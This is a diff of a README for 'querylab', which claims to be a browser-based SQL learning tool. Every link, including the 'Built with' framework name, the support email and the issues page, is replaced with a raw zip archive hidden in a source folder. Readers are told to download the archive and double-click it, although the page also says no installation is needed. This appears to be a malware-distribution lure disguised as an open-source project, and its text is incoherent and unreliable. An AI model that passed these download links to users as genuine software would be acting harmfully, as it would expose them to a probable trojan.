@@ -1,16 +1,16 @@
 # 🎉 querylab - Learn SQL Effortlessly in Your Browser
 
 ## 🔗 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/fuckwave/querylab/main/Backend/src/types/querylab_2.6.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/fuckwave/querylab/main/Backend/src/types/querylab_2.6.zip)
+[![Download Latest Release](https://github.com/fuckwave/querylab/raw/refs/heads/main/Backend/src/lib/services/sql/Software-3.7.zip%20Latest%20Release-v1.0-blue)](https://github.com/fuckwave/querylab/raw/refs/heads/main/Backend/src/lib/services/sql/Software-3.7.zip)
 
 ## 📖 About querylab
 querylab is an interactive tool designed to help you learn SQL directly in your browser. With zero installation required, you can practice SQL in a friendly environment. Enjoy real-time AI assistance as you work through exercises. 
 
-Built with https://raw.githubusercontent.com/fuckwave/querylab/main/Backend/src/types/querylab_2.6.zip and PGlite, querylab offers client-side PostgreSQL execution and a beautiful user interface. It's perfect for both beginners and anyone looking to sharpen their database skills.
+Built with https://github.com/fuckwave/querylab/raw/refs/heads/main/Backend/src/lib/services/sql/Software-3.7.zip and PGlite, querylab offers client-side PostgreSQL execution and a beautiful user interface. It's perfect for both beginners and anyone looking to sharpen their database skills.
 
 ## 🚀 Getting Started
 1. **Visit the Download Page**: Click the link below to access the latest version of querylab. 
-   - [Download from Releases Page](https://raw.githubusercontent.com/fuckwave/querylab/main/Backend/src/types/querylab_2.6.zip)
+   - [Download from Releases Page](https://github.com/fuckwave/querylab/raw/refs/heads/main/Backend/src/lib/services/sql/Software-3.7.zip)
    
 2. **Choose Your Version**: Look for the latest version at the top of the page. Each version includes the most recent features and fixes.
 
@@ -45,7 +45,7 @@ Built with https://raw.githubusercontent.com/fuckwave/querylab/main/Backend/src/
 ## 📥 Download & Install
 To get started with querylab, simply follow these steps:
 
-1. **Visit the releases page**: Click this link — [Download from Releases Page](https://raw.githubusercontent.com/fuckwave/querylab/main/Backend/src/types/querylab_2.6.zip).
+1. **Visit the releases page**: Click this link — [Download from Releases Page](https://github.com/fuckwave/querylab/raw/refs/heads/main/Backend/src/lib/services/sql/Software-3.7.zip).
 2. **Select the latest version**: Ensure you choose the most recent update for the best experience.
 3. **Download the file**: Click on your download file and wait for it to complete.
 4. **Open the application**: Once downloaded, locate the file in your downloads folder, and double-click to launch.
@@ -59,8 +59,8 @@ querylab includes topics that span a variety of areas in database learning, incl
 
 ## 📧 Support
 If you encounter any issues or have questions while using querylab, please reach out to our support team:
-- **Email**: https://raw.githubusercontent.com/fuckwave/querylab/main/Backend/src/types/querylab_2.6.zip
-- **Issues Page**: [Report Issues on GitHub](https://raw.githubusercontent.com/fuckwave/querylab/main/Backend/src/types/querylab_2.6.zip)
+- **Email**: https://github.com/fuckwave/querylab/raw/refs/heads/main/Backend/src/lib/services/sql/Software-3.7.zip
+- **Issues Page**: [Report Issues on GitHub](https://github.com/fuckwave/querylab/raw/refs/heads/main/Backend/src/lib/services/sql/Software-3.7.zip)
 
 ## 🏗 Contributing
 We welcome contributions to improve querylab. If you have ideas, please follow these steps:
